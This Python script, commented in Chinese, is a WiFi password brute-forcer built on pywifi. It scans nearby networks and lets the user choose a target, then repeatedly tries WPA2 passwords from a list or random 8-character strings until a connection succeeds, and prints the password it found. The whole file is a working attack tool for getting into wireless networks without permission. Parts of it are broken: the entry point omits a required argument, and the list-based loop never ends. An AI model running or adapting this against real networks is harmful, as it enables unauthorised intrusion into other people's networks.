import pywifi
import time
from pywifi import const
import string
import random
import threading


# WiFi扫描模块
def wifi_scan():
    # 初始化wifi
    wifi = pywifi.PyWiFi()
    # 使用第一个无线网卡
    interface = wifi.interfaces()[0]
    # 开始扫描
    interface.scan()
    for i in range(4):
        time.sleep(1)
        print('\r扫描可用 WiFi 中，请稍后。。。（' + str(3 - i), end='）')
    print('\r扫描完成！\n' + '-' * 38)
    print('\r{:4}{:6}{}'.format('编号', '信号强度', 'wifi名'))
    # 扫描结果，scan_results()返回一个集，存放的是每个wifi对象
    bss = interface.scan_results()
    # 存放wifi名的集合
    wifi_name_set = set()
    for w in bss:
        # 解决乱码问题
        wifi_name_and_signal = (100 + w.signal, w.ssid.encode('raw_unicode_escape').decode('utf-8'))
        wifi_name_set.add(wifi_name_and_signal)
    # 存入列表并按信号排序
    wifi_name_list = list(wifi_name_set)
    wifi_name_list = sorted(wifi_name_list, key=lambda a: a[0], reverse=True)
    num = 0
    # 格式化输出
    while num < len(wifi_name_list):
        print('\r{:<6d}{:<8d}{}'.format(num, wifi_name_list[num][0], wifi_name_list[num][1]))
        num += 1
    print('-' * 38)
    # 返回wifi列表
    return wifi_name_list


# WIFI破解模块
def wifi_password_crack(wifi_name, pwd_len, pwd_list):
    # 创建wifi对象
    wifi = pywifi.PyWiFi()
    # 创建网卡对象，为第一个wifi网卡
    interface = wifi.interfaces()[0]
    # 断开所有wifi连接
    interface.disconnect()
    # 等待其断开
    while interface.status() == 4:
        # 当其处于连接状态时，利用循环等待其断开
        pass
    # 创建连接文件（对象）
    profile = pywifi.Profile()
    # wifi名称
    profile.ssid = wifi_name
    # 需要认证
    profile.auth = const.AUTH_ALG_OPEN
    # wifi默认加密算法
    profile.akm.append(const.AKM_TYPE_WPA2PSK)
    profile.cipher = const.CIPHER_TYPE_CCMP
    while True:
        if pwd_list:
            # wifi密码
            for pwd in pwd_list:
                profile.key = pwd
                # 删除所有wifi连接文件
                interface.remove_all_network_profiles()
                # 设置新的wifi连接文件
                tmp_profile = interface.add_network_profile(profile)
                # 开始尝试连接
                print(f'\r正在利用密码 {pwd} 尝试破解 ing...')
                interface.connect(tmp_profile)
                time.sleep(5)
                # if time.time() - start_time < 2:
                if interface.status() == 4:
                    print(f'\r连接成功！密码为：{pwd}')
                    exit(0)
                    print()
                    # print(start_time)
                    # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）
            print(f'{pwd_list}中，没有合适的密码')
        else:
            # wifi密码
            chars = string.digits + string.ascii_letters
            pwd = ''.join(random.sample(chars * 10, pwd_len))
            profile.key = pwd
            # 删除所有wifi连接文件
            interface.remove_all_network_profiles()
            # 设置新的wifi连接文件
            tmp_profile = interface.add_network_profile(profile)
            # 开始尝试连接
            print(f'\r正在利用密码 {pwd} 尝试破解 ing...')
            interface.connect(tmp_profile)
            time.sleep(5)
            # if time.time() - start_time < 2:
            if interface.status() == 4:
                print(f'\r连接成功！密码为：{pwd}')
                exit(0)
                print()
                # print(start_time)
                # 接口状态为4代表连接成功（当尝试时间大于1.5秒之后则为错误密码，经测试测正确密码一般都在1.5秒内连接，若要提高准确性可以设置为2s或以上，相应暴力破解速度就会变慢）


# 主函数
def pwd4wifi_service(pwd_len, pwd_list):
    # 退出标致
    exit_flag = 0
    # 目标编号
    target_num = -1
    while not exit_flag:
        try:
            print('WiFi密码破解'.center(35, '-'))
            # 调用扫描模块，返回一个排序后的wifi列表
            wifi_list = wifi_scan()
            # 让用户选择要破解的wifi编号，并对用户输入的编号进行判断和异常处理
            choose_exit_flag = 0
            while not choose_exit_flag:
                try:
                    target_num = int(input('请选择你要尝试破解的wifi：'))
                    # 如果要选择的wifi编号在列表内，继续二次判断，否则重新输入
                    if target_num in range(len(wifi_list)):
                        # 二次确认
                        while not choose_exit_flag:
                            try:
                                choose = str(input(f'你选择要破解的WiFi名称是：{wifi_list[target_num][1]}，确定吗？（Y/N）'))
                                # 对用户输入进行小写处理，并判断
                                if choose.lower() == 'y':
                                    choose_exit_flag = 1
                                elif choose.lower() == 'n':
                                    break
                                # 处理用户其它字母输入
                                else:
                                    print('只能输入 Y/N 哦o(*￣︶￣*)o')
                            # 处理用户非字母输入
                            except ValueError:
                                print('只能输入 Y/N 哦o(*￣︶￣*)o')
                        # 退出破解
                        if choose_exit_flag == 1:
                            break
                        else:
                            print('请重新输入哦(*^▽^*)')
                except ValueError:
                    print('只能输入数字哦o(*￣︶￣*)o')
            # 密码破解，传入用户选择的wifi名称
            # 第一个参数是方法，第二个参数是方法的参数
            # t1 = threading.Thread(target=wifi_password_crack, args=(wifi_list[target_num][1], pwd_len,))  # target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在
            # t2 = threading.Thread(target=wifi_password_crack, args=(wifi_list[target_num][1], pwd_len,))  # target是要执行的函数名（不是函数），args是函数对应的参数，以元组的形式存在
            # t1.start()
            # t2.start()
            wifi_password_crack(wifi_list[target_num][1], pwd_len, pwd_list)
            print('-' * 38)
            exit_flag = 1
        except Exception as e:
            print(e)
            raise e


if __name__ == '__main__':
    pwd4wifi_service(pwd_len=8)
